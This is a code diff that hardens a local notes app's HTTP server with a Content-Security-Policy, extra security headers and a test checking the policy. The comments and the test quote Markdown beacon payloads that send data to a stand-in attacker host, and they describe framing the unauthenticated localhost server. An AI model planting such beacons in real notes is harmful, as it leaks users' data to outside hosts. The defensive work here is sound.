@@ -492,6 +492,59 @@ fn content_type(name: &str) -> &'static str {
     }
 }
 
+/// The one line that makes "nothing phones home" true rather than merely intended.
+///
+/// A note is Markdown, and Markdown renders remote images. Without this, a single
+/// `![](https://attacker/p.png?leak=…)` in a note someone else wrote — pulled in by a
+/// merge, a copy, or a shared vault — fetches an attacker's URL **on render, from the
+/// user's machine**. That is not a hypothetical XSS chain: it needs no script, survives
+/// DOMPurify (whose allow-list permits `https:` URLs), and survives a human reading the
+/// diff. The app already self-hosts Excalidraw's fonts to avoid exactly this; the
+/// renderer had no equivalent guard.
+///
+/// Each clause, and why it is as tight as it is:
+/// - `default-src 'self'` — the backstop for anything not named below.
+/// - `img-src 'self' data: blob:` — the beacon fix. `data:`/`blob:` are local bytes
+///   (pasted images, object URLs), so they carry no request off the machine.
+/// - `style-src … 'unsafe-inline'` — unavoidable and low-risk: Mermaid injects `<style>`,
+///   and KaTeX/Excalidraw set `style=` attributes on every element they draw.
+/// - `script-src 'self'` with **no** `'unsafe-inline'` — the clause worth protecting.
+///   Excalidraw's asset-path line was moved out of `index.html` into its own file for it.
+///   `wasm-unsafe-eval` allows bundled WebAssembly without allowing `eval` of strings.
+/// - `connect-src 'self'` — even a script that does run cannot exfiltrate by `fetch`.
+/// - `object-src`/`frame-src 'none'`, `base-uri 'self'`, `form-action 'none'` — close the
+///   remaining ways a document can be made to reach out.
+/// - `frame-ancestors 'none'` — **not** covered by `default-src`, and the one clause aimed at
+///   the threat the Host/Origin guards above already take seriously: the server sits at a fixed
+///   localhost port with no authentication, so any page the user visits can frame it. Without
+///   this, that page can overlay a destructive control and have the user click it.
+/// - `media-src`/`font-src`/`worker-src` — the app's own needs: `<video>` from object URLs,
+///   KaTeX's bundled woff2, and pica's `blob:` resize worker (Excalidraw image insert).
+///
+/// **Deliberately absent: `'unsafe-eval'`.** Excalidraw's font *subsetter* is harfbuzz compiled
+/// with emscripten embind, which calls `Function(string)` — so `getContent()` throws, is caught
+/// by Excalidraw, and an exported SVG embeds a font URL instead of the font bytes. That is a
+/// real, accepted loss: exports render in fallback fonts elsewhere. Allowing `'unsafe-eval'`
+/// to fix it would hand every string in a note a path to execution, which is the whole thing
+/// this policy exists to prevent. In-app board rendering is unaffected.
+///
+/// **Not stopped by any CSP:** a top-level navigation the user clicks
+/// (`[click here](https://attacker/?leak=…)`). `navigate-to` was dropped from the spec.
+/// `Referrer-Policy: no-referrer` limits what such a click carries.
+const CSP: &str = "default-src 'self'; \
+img-src 'self' data: blob:; \
+media-src 'self' blob:; \
+style-src 'self' 'unsafe-inline'; \
+font-src 'self' data:; \
+script-src 'self' 'wasm-unsafe-eval'; \
+worker-src 'self' blob:; \
+connect-src 'self'; \
+object-src 'none'; \
+frame-src 'none'; \
+frame-ancestors 'none'; \
+base-uri 'self'; \
+form-action 'none'";
+
 fn write_response(
     stream: &mut TcpStream,
     status: &str,
@@ -499,7 +552,7 @@ fn write_response(
     body: &[u8],
 ) -> std::io::Result<()> {
     let header = format!(
-        "HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Length: {}\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n",
+        "HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Security-Policy: {CSP}\r\nX-Content-Type-Options: nosniff\r\nReferrer-Policy: no-referrer\r\nContent-Length: {}\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n",
         body.len()
     );
     stream.write_all(header.as_bytes())?;
@@ -648,6 +701,39 @@ mod tests {
         let (status, _) =
             request("POST /api/alive HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
         assert_eq!(status, "HTTP/1.1 200 OK");
+    }
+
+    /// The beacon guard. A note that arrives through a merge or a shared vault can contain
+    /// `![](https://attacker/p.png?leak=…)`, which fetches on render with no script involved
+    /// — so the policy has to be on the response, not in the sanitiser.
+    #[test]
+    fn every_response_carries_a_policy_that_stops_a_note_phoning_home() {
+        let (_, headers) = request("GET / HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
+        let csp = headers
+            .lines()
+            .find_map(|l| l.strip_prefix("Content-Security-Policy: "))
+            .unwrap_or_else(|| panic!("no CSP on a page response:\n{headers}"));
+
+        // A remote image must not be loadable, and a remote `fetch` must not be reachable.
+        assert!(csp.contains("img-src 'self' data: blob:"), "{csp}");
+        assert!(csp.contains("connect-src 'self'"), "{csp}");
+        assert!(csp.contains("default-src 'self'"), "{csp}");
+        // `default-src` does NOT back-stop this one, and the server sits at a fixed localhost
+        // port with no auth — so without it any page the user visits can frame the app and
+        // overlay a destructive control.
+        assert!(csp.contains("frame-ancestors 'none'"), "{csp}");
+        // `'unsafe-eval'` would hand every string in a note a path to execution. Excalidraw's
+        // font subsetter wants it; we accept the degraded export instead (see `CSP`).
+        assert!(!csp.contains("'unsafe-eval'") || csp.contains("'wasm-unsafe-eval'"), "{csp}");
+        assert!(!csp.replace("'wasm-unsafe-eval'", "").contains("'unsafe-eval'"), "{csp}");
+        // The clause worth protecting: no inline scripts, so a sanitiser bypass is not
+        // automatically code execution. Excalidraw's asset-path line lives in its own file
+        // to keep this true — if that regresses, this test is the alarm.
+        let scripts = csp.split("script-src").nth(1).unwrap_or("");
+        assert!(
+            !scripts.split(';').next().unwrap_or("").contains("'unsafe-inline'"),
+            "script-src must never allow inline: {csp}"
+        );
     }
 
     #[test]
